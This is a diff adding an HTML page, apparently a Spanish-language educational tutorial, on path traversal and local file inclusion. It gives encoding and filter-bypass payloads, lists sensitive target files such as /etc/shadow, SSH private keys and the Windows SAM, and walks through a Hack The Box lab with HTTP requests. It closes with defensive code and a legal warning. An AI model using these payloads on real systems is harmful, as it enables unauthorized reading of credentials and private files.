@@ -1,0 +1,811 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Guía completa de vulnerabilidades Path Traversal. Aprende técnicas de directory traversal, LFI y explotación de rutas con ejemplos prácticos de HTB Inject.">
+    <meta name="keywords" content="path traversal, directory traversal, LFI, local file inclusion, vulnerabilidades web, pentesting">
+    <title>Path Traversal - Vulnerabilidades de Traversal de Directorios | HackingUsef</title>
+    
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        :root {
+            --primary-color: #00ff88;
+            --secondary-color: #ff6b35;
+            --accent-color: #7c3aed;
+            --dark-bg: #0a0a0a;
+            --darker-bg: #000000;
+            --card-bg: #1a1a1a;
+            --text-primary: #ffffff;
+            --text-secondary: #a0a0a0;
+            --text-muted: #666666;
+            --border-color: #333333;
+            --code-bg: #1e1e1e;
+            --gradient-primary: linear-gradient(135deg, #00ff88 0%, #00d4ff 100%);
+            --danger-color: #e74c3c;
+            --warning-color: #f39c12;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--dark-bg);
+            color: var(--text-primary);
+            line-height: 1.7;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            padding: 2rem 0 3rem;
+            border-bottom: 1px solid var(--border-color);
+            margin-bottom: 3rem;
+        }
+
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: var(--primary-color);
+            text-decoration: none;
+            margin-bottom: 2rem;
+            font-size: 0.9rem;
+            transition: all 0.3s ease;
+        }
+
+        .back-link:hover {
+            transform: translateX(-5px);
+        }
+
+        h1 {
+            font-size: 2.8rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            background: var(--gradient-primary);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .subtitle {
+            font-size: 1.2rem;
+            color: var(--text-secondary);
+            font-weight: 300;
+        }
+
+        /* Content sections */
+        .section {
+            margin-bottom: 4rem;
+        }
+
+        h2 {
+            color: var(--primary-color);
+            font-size: 1.8rem;
+            margin-bottom: 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+        }
+
+        h3 {
+            color: var(--secondary-color);
+            font-size: 1.4rem;
+            margin: 2rem 0 1rem;
+        }
+
+        h4 {
+            color: var(--accent-color);
+            font-size: 1.2rem;
+            margin: 1.5rem 0 0.8rem;
+        }
+
+        p {
+            margin-bottom: 1.5rem;
+            color: var(--text-primary);
+        }
+
+        /* Alert boxes */
+        .alert {
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin: 2rem 0;
+            border-left: 4px solid;
+        }
+
+        .alert-definition {
+            background: rgba(0, 255, 136, 0.1);
+            border-color: var(--primary-color);
+        }
+
+        .alert-danger {
+            background: rgba(231, 76, 60, 0.1);
+            border-color: var(--danger-color);
+        }
+
+        .alert-warning {
+            background: rgba(255, 107, 53, 0.1);
+            border-color: var(--secondary-color);
+        }
+
+        .alert-info {
+            background: rgba(124, 58, 237, 0.1);
+            border-color: var(--accent-color);
+        }
+
+        /* Code blocks */
+        .code-block {
+            background: var(--code-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 2rem 0;
+            position: relative;
+            overflow-x: auto;
+        }
+
+        .code-block code {
+            font-family: 'JetBrains Mono', monospace;
+            color: var(--primary-color);
+            font-size: 0.95rem;
+            white-space: pre;
+        }
+
+        .code-label {
+            position: absolute;
+            top: -12px;
+            left: 1rem;
+            background: var(--card-bg);
+            color: var(--text-secondary);
+            padding: 0.3rem 0.8rem;
+            font-size: 0.8rem;
+            border-radius: 4px;
+            border: 1px solid var(--border-color);
+        }
+
+        /* Example sections */
+        .example {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 2rem;
+            margin: 3rem 0;
+        }
+
+        .example-title {
+            color: var(--secondary-color);
+            font-size: 1.3rem;
+            margin-bottom: 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .machine-info {
+            background: rgba(124, 58, 237, 0.1);
+            border: 1px solid var(--accent-color);
+            border-radius: 6px;
+            padding: 1rem;
+            margin: 1rem 0;
+            font-size: 0.9rem;
+        }
+
+        /* Payload grid */
+        .payload-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 1.5rem;
+            margin: 2rem 0;
+        }
+
+        .payload-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 1.5rem;
+            transition: all 0.3s ease;
+        }
+
+        .payload-card:hover {
+            border-color: var(--primary-color);
+            transform: translateY(-2px);
+        }
+
+        .payload-title {
+            color: var(--primary-color);
+            font-size: 1rem;
+            font-weight: 600;
+            margin-bottom: 0.8rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .payload-desc {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            margin-bottom: 1rem;
+        }
+
+        .payload-code {
+            background: var(--darker-bg);
+            border-radius: 4px;
+            padding: 0.8rem;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            color: var(--primary-color);
+            word-break: break-all;
+        }
+
+        /* Tools grid */
+        .tools-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+            margin: 2rem 0;
+        }
+
+        .tool-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 1.5rem;
+            transition: all 0.3s ease;
+        }
+
+        .tool-card:hover {
+            border-color: var(--primary-color);
+            transform: translateY(-2px);
+        }
+
+        .tool-name {
+            color: var(--primary-color);
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+
+        .tool-desc {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        /* Attack flow */
+        .attack-flow {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+            margin: 2rem 0;
+        }
+
+        .flow-step {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            padding: 1rem;
+            background: var(--card-bg);
+            border-radius: 8px;
+            border-left: 4px solid var(--primary-color);
+        }
+
+        .flow-number {
+            background: var(--primary-color);
+            color: var(--dark-bg);
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+
+        .flow-content {
+            flex: 1;
+        }
+
+        .flow-title {
+            color: var(--primary-color);
+            font-weight: 600;
+            margin-bottom: 0.3rem;
+        }
+
+        .flow-desc {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        /* Images */
+        .image-container {
+            margin: 2rem 0;
+            text-align: center;
+        }
+
+        .image-container img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+        }
+
+        /* Lists */
+        ul, ol {
+            margin-left: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+
+        li {
+            margin-bottom: 0.5rem;
+            color: var(--text-primary);
+        }
+
+        /* URL display */
+        .url-display {
+            background: var(--code-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 1rem;
+            margin: 1rem 0;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
+            color: var(--primary-color);
+            word-break: break-all;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 3rem 0 2rem;
+            border-top: 1px solid var(--border-color);
+            margin-top: 4rem;
+            color: var(--text-muted);
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .container {
+                padding: 1rem;
+            }
+            
+            h1 {
+                font-size: 2.2rem;
+            }
+            
+            .payload-grid,
+            .tools-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <header class="header">
+            <a href="../" class="back-link">
+                <i class="fas fa-arrow-left"></i>
+                Volver al inicio
+            </a>
+            <h1>Path Traversal</h1>
+            <p class="subtitle">Vulnerabilidades de Traversal de Directorios y Local File Inclusion</p>
+        </header>
+
+        <main>
+            <section class="section">
+                <h2><i class="fas fa-folder-open"></i>¿Qué es Path Traversal?</h2>
+                
+                <div class="alert alert-definition">
+                    <p><strong>Definición:</strong> Path Traversal (también conocido como Directory Traversal) es una vulnerabilidad de seguridad web que permite a los atacantes acceder a archivos y directorios que se encuentran fuera del directorio raíz del servidor web. Esta vulnerabilidad explota la falta de validación adecuada en las rutas de archivo, permitiendo navegación no autorizada a través del sistema de archivos del servidor.</p>
+                </div>
+
+                <p>Esta vulnerabilidad puede permitir a los atacantes:</p>
+                <ul>
+                    <li><strong>Lectura de archivos sensibles:</strong> /etc/passwd, archivos de configuración</li>
+                    <li><strong>Acceso a código fuente:</strong> Revelar lógica de aplicación</li>
+                    <li><strong>Enumeración del sistema:</strong> Estructura de directorios y archivos</li>
+                    <li><strong>Escalación de privilegios:</strong> Acceso a claves SSH, tokens</li>
+                </ul>
+
+                <div class="alert alert-danger">
+                    <p><strong>Impacto de Seguridad:</strong> Las vulnerabilidades de Path Traversal pueden resultar en exposición completa de información confidencial, compromiso del servidor y en casos extremos, ejecución remota de código.</p>
+                </div>
+            </section>
+
+            <section class="section">
+                <h2><i class="fas fa-tools"></i>Herramientas de Explotación</h2>
+                
+                <div class="tools-grid">
+                    <div class="tool-card">
+                        <div class="tool-name">Burp Suite</div>
+                        <div class="tool-desc">Proxy interceptor para modificar peticiones HTTP y automatizar ataques de traversal.</div>
+                    </div>
+                    
+                    <div class="tool-card">
+                        <div class="tool-name">OWASP ZAP</div>
+                        <div class="tool-desc">Scanner de seguridad web con detección automática de vulnerabilidades de traversal.</div>
+                    </div>
+                    
+                    <div class="tool-card">
+                        <div class="tool-name">DirBuster</div>
+                        <div class="tool-desc">Herramienta de fuerza bruta para descubrir archivos y directorios ocultos.</div>
+                    </div>
+                    
+                    <div class="tool-card">
+                        <div class="tool-name">Wfuzz</div>
+                        <div class="tool-desc">Fuzzer web para automatizar ataques de path traversal con diccionarios personalizados.</div>
+                    </div>
+                </div>
+            </section>
+
+            <section class="section">
+                <h2><i class="fas fa-code"></i>Técnicas de Path Traversal</h2>
+
+                <h3>Payloads Básicos</h3>
+                <div class="payload-grid">
+                    <div class="payload-card">
+                        <div class="payload-title">
+                            <i class="fas fa-arrow-up"></i>
+                            Traversal Básico
+                        </div>
+                        <div class="payload-desc">Navegación hacia directorios superiores</div>
+                        <div class="payload-code">../../../etc/passwd</div>
+                    </div>
+                    
+                    <div class="payload-card">
+                        <div class="payload-title">
+                            <i class="fas fa-globe"></i>
+                            URL Encoding
+                        </div>
+                        <div class="payload-desc">Codificación para evadir filtros</div>
+                        <div class="payload-code">%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</div>
+                    </div>
+                    
+                    <div class="payload-card">
+                        <div class="payload-title">
+                            <i class="fas fa-layer-group"></i>
+                            Double Encoding
+                        </div>
+                        <div class="payload-desc">Doble codificación para evasión avanzada</div>
+                        <div class="payload-code">%252e%252e%252f</div>
+                    </div>
+                    
+                    <div class="payload-card">
+                        <div class="payload-title">
+                            <i class="fas fa-code-branch"></i>
+                            Null Byte
+                        </div>
+                        <div class="payload-desc">Truncar validación con null bytes</div>
+                        <div class="payload-code">../../../etc/passwd%00.jpg</div>
+                    </div>
+                    
+                    <div class="payload-card">
+                        <div class="payload-title">
+                            <i class="fas fa-windows"></i>
+                            Windows Paths
+                        </div>
+                        <div class="payload-desc">Rutas específicas para sistemas Windows</div>
+                        <div class="payload-code">..\..\..\windows\system32\drivers\etc\hosts</div>
+                    </div>
+                    
+                    <div class="payload-card">
+                        <div class="payload-title">
+                            <i class="fas fa-linux"></i>
+                            Linux Paths
+                        </div>
+                        <div class="payload-desc">Rutas comunes en sistemas Linux/Unix</div>
+                        <div class="payload-code">../../../../proc/version</div>
+                    </div>
+                </div>
+            </section>
+
+            <section class="section">
+                <h2><i class="fas fa-server"></i>Caso Práctico: HTB Inject</h2>
+
+                <div class="example">
+                    <div class="example-title">
+                        <i class="fas fa-bug"></i>
+                        Explotación de Path Traversal en Aplicación Web
+                    </div>
+                    
+                    <div class="machine-info">
+                        <strong>Información del objetivo:</strong>
+                        <ul>
+                            <li><strong>Máquina:</strong> HTB Inject (10.10.11.204)</li>
+                            <li><strong>Puerto:</strong> 8080</li>
+                            <li><strong>Vulnerabilidad:</strong> Path Traversal en funcionalidad de upload</li>
+                            <li><strong>Objetivo:</strong> Lectura de archivos del sistema</li>
+                        </ul>
+                    </div>
+
+                    <h4>Proceso de Explotación:</h4>
+                    
+                    <div class="attack-flow">
+                        <div class="flow-step">
+                            <div class="flow-number">1</div>
+                            <div class="flow-content">
+                                <div class="flow-title">Descubrimiento de Funcionalidad</div>
+                                <div class="flow-desc">Identificación de endpoint de upload de imágenes vulnerable</div>
+                            </div>
+                        </div>
+                        
+                        <div class="flow-step">
+                            <div class="flow-number">2</div>
+                            <div class="flow-content">
+                                <div class="flow-title">Análisis de Parámetros</div>
+                                <div class="flow-desc">Examen del parámetro "img" en la función show_image</div>
+                            </div>
+                        </div>
+                        
+                        <div class="flow-step">
+                            <div class="flow-number">3</div>
+                            <div class="flow-content">
+                                <div class="flow-title">Intercepción con Burp Suite</div>
+                                <div class="flow-desc">Captura y modificación de peticiones HTTP</div>
+                            </div>
+                        </div>
+                        
+                        <div class="flow-step">
+                            <div class="flow-number">4</div>
+                            <div class="flow-content">
+                                <div class="flow-title">Explotación Exitosa</div>
+                                <div class="flow-desc">Lectura de archivos críticos del sistema</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <h4>URL de Upload Original:</h4>
+                    <div class="url-display">http://10.10.11.204:8080/upload</div>
+
+                    <h4>URL de Visualización Vulnerable:</h4>
+                    <div class="url-display">http://10.10.11.204:8080/show_image?img=anonymous.jpg</div>
+
+                    <div class="alert alert-info">
+                        <p><strong>Análisis de la Vulnerabilidad:</strong></p>
+                        <ul>
+                            <li>El parámetro <code>img</code> no valida la entrada del usuario</li>
+                            <li>Permite caracteres de traversal como <code>../</code></li>
+                            <li>No restringe el acceso a directorios del sistema</li>
+                            <li>Carece de lista blanca de archivos permitidos</li>
+                        </ul>
+                    </div>
+
+                    <h4>Payload de Explotación - Archivo passwd:</h4>
+                    <div class="code-block">
+                        <div class="code-label">HTTP Request</div>
+                        <code>GET /show_image?img=../../../../../../etc/passwd HTTP/1.1
+Host: 10.10.11.204:8080
+User-Agent: Mozilla/5.0 (compatible; HackingUsef/1.0)
+Accept: text/html,application/xhtml+xml</code>
+                    </div>
+
+                    <div class="alert alert-warning">
+                        <p><strong>Resultado obtenido:</strong> El payload permite acceder al archivo <code>/etc/passwd</code>, revelando usuarios del sistema como root, daemon, bin, sys, sync, games, man, lp, mail, news, www-data, y otros usuarios críticos.</p>
+                    </div>
+
+                    <h4>Payload de Explotación - Directorio WebApp:</h4>
+                    <div class="code-block">
+                        <div class="code-label">HTTP Request</div>
+                        <code>GET /show_image?img=../../../../../../var/www/WebApp HTTP/1.1
+Host: 10.10.11.204:8080</code>
+                    </div>
+
+                    <p>Este payload permite el <strong>directory listing</strong> de la aplicación web, revelando:</p>
+                    <ul>
+                        <li>Estructura de la aplicación</li>
+                        <li>Archivos de configuración</li>
+                        <li>Código fuente de la aplicación</li>
+                        <li>Dependencias y librerías utilizadas</li>
+                    </ul>
+                </div>
+            </section>
+
+            <section class="section">
+                <h2><i class="fas fa-list"></i>Archivos Objetivo Comunes</h2>
+
+                <h3>Sistemas Linux/Unix</h3>
+                <div class="payload-grid">
+                    <div class="payload-card">
+                        <div class="payload-title">
+                            <i class="fas fa-users"></i>
+                            Usuarios del Sistema
+                        </div>
+                        <div class="payload-code">/etc/passwd<br>/etc/shadow<br>/etc/group</div>
+                    </div>
+                    
+                    <div class="payload-card">
+                        <div class="payload-title">
+                            <i class="fas fa-cog"></i>
+                            Configuraciones
+                        </div>
+                        <div class="payload-code">/etc/apache2/apache2.conf<br>/etc/nginx/nginx.conf<br>/etc/ssh/sshd_config</div>
+                    </div>
+                    
+                    <div class="payload-card">
+                        <div class="payload-title">
+                            <i class="fas fa-key"></i>
+                            Claves y Tokens
+                        </div>
+                        <div class="payload-code">/root/.ssh/id_rsa<br>/home/user/.ssh/authorized_keys<br>/etc/ssl/private/</div>
+                    </div>
+                </div>
+
+                <h3>Sistemas Windows</h3>
+                <div class="payload-grid">
+                    <div class="payload-card">
+                        <div class="payload-title">
+                            <i class="fas fa-shield-alt"></i>
+                            Sistema Windows
+                        </div>
+                        <div class="payload-code">C:\Windows\System32\drivers\etc\hosts<br>C:\Windows\System32\config\SAM<br>C:\boot.ini</div>
+                    </div>
+                    
+                    <div class="payload-card">
+                        <div class="payload-title">
+                            <i class="fas fa-server"></i>
+                            IIS y Aplicaciones
+                        </div>
+                        <div class="payload-code">C:\inetpub\wwwroot\web.config<br>C:\Windows\debug\NetSetup.log<br>C:\Windows\Panther\Unattend.xml</div>
+                    </div>
+                </div>
+            </section>
+
+            <section class="section">
+                <h2><i class="fas fa-shield-alt"></i>Técnicas de Evasión</h2>
+
+                <div class="tools-grid">
+                    <div class="tool-card">
+                        <div class="tool-name">Encoding Múltiple</div>
+                        <div class="tool-desc">
+                            <div class="payload-code">%2e%2e%2f (URL)<br>%252e%252e%252f (Double)<br>\u002e\u002e\u002f (Unicode)</div>
+                        </div>
+                    </div>
+                    
+                    <div class="tool-card">
+                        <div class="tool-name">Caracteres Alternativos</div>
+                        <div class="tool-desc">
+                            <div class="payload-code">..\/..\/..\/etc/passwd<br>.\\.\\.\\.\\windows\\system32</div>
+                        </div>
+                    </div>
+                    
+                    <div class="tool-card">
+                        <div class="tool-name">Bypass de Filtros</div>
+                        <div class="tool-desc">
+                            <div class="payload-code">....//....//....//etc/passwd<br>..%2f..%2f..%2fetc%2fpasswd</div>
+                        </div>
+                    </div>
+                    
+                    <div class="tool-card">
+                        <div class="tool-name">Truncamiento</div>
+                        <div class="tool-desc">
+                            <div class="payload-code">../../../etc/passwd%00.png<br>../../../etc/passwd%0a.jpg</div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section class="section">
+                <h2><i class="fas fa-lock"></i>Medidas de Protección</h2>
+
+                <div class="alert alert-info">
+                    <p><strong>Implementación de Defensas:</strong></p>
+                    <ul>
+                        <li><strong>Validación de Entrada:</strong> Lista blanca de archivos permitidos</li>
+                        <li><strong>Canonicalización:</strong> Resolver rutas absolutas antes de la validación</li>
+                        <li><strong>Sandboxing:</strong> Restringir acceso a directorios específicos</li>
+                        <li><strong>Principio de menor privilegio:</strong> Permisos mínimos para la aplicación</li>
+                    </ul>
+                </div>
+
+                <h3>Validación Segura (Ejemplo en PHP)</h3>
+                <div class="code-block">
+                    <div class="code-label">PHP Secure Code</div>
+                    <code><?php
+function secureFileAccess($filename) {
+    // Definir directorio base permitido
+    $baseDir = '/var/www/uploads/';
+    
+    // Sanitizar entrada
+    $filename = basename($filename);
+    
+    // Construir ruta completa
+    $fullPath = realpath($baseDir . $filename);
+    
+    // Verificar que está dentro del directorio permitido
+    if (strpos($fullPath, realpath($baseDir)) !== 0) {
+        throw new Exception('Path traversal attempt detected');
+    }
+    
+    // Verificar que el archivo existe
+    if (!file_exists($fullPath)) {
+        throw new Exception('File not found');
+    }
+    
+    return $fullPath;
+}
+?></code>
+                </div>
+
+                <h3>Configuración de Servidor</h3>
+                <div class="code-block">
+                    <div class="code-label">Apache .htaccess</div>
+                    <code># Denegar acceso a archivos de sistema
+<Files ~ "^\.(htaccess|htpasswd|ini|phps|fla|psd|log|sh)$">
+    Order Allow,Deny
+    Deny from all
+</Files>
+
+# Prevenir acceso a directorios superiores
+RewriteEngine On
+RewriteCond %{THE_REQUEST} \s[^?]*\.\./[^?\s]* [NC]
+RewriteRule .* - [F]</code>
+                </div>
+            </section>
+
+            <section class="section">
+                <h2><i class="fas fa-exclamation-triangle"></i>Consideraciones Éticas y Legales</h2>
+                
+                <div class="alert alert-danger">
+                    <p><strong>Advertencia Legal:</strong> Las técnicas de Path Traversal solo deben utilizarse en:</p>
+                    <ul>
+                        <li>Aplicaciones web propias o con autorización explícita</li>
+                        <li>Plataformas de práctica autorizadas (HTB, TryHackMe, DVWA)</li>
+                        <li>Entornos de pentesting con contrato legal válido</li>
+                        <li>Laboratorios controlados de ciberseguridad</li>
+                    </ul>
+                    <p>El acceso no autorizado a archivos del sistema constituye una violación grave de la seguridad informática y puede ser constitutivo de delito según las leyes locales e internacionales.</p>
+                </div>
+            </section>
+
+            <section class="section">
+                <h2><i class="fas fa-graduation-cap"></i>Recursos de Práctica</h2>
+                
+                <div class="tools-grid">
+                    <div class="tool-card">
+                        <div class="tool-name">DVWA</div>
+                        <div class="tool-desc">Damn Vulnerable Web Application con módulo específico de File Inclusion</div>
+                    </div>
+                    
+                    <div class="tool-card">
+                        <div class="tool-name">WebGoat</div>
+                        <div class="tool-desc">Proyecto OWASP con lecciones interactivas de Path Traversal</div>
+                    </div>
+                    
+                    <div class="tool-card">
+                        <div class="tool-name">PentesterLab</div>
+                        <div class="tool-desc">Laboratorios web con ejercicios de Directory Traversal</div>
+                    </div>
+                    
+                    <div class="tool-card">
+                        <div class="tool-name">PortSwigger Academy</div>
+                        <div class="tool-desc">Labs gratuitos de Path Traversal con diferentes niveles de dificultad</div>
+                    </div>
+                </div>
+            </section>
+        </main>
+
+        <footer class="footer">
+            <p>&copy; 2024 HackingUsef - Educación en Ciberseguridad</p>
+            <p>Contenido educativo para profesionales de la seguridad informática</p>
+        </footer>
+    </div>
+</body>
+</html>
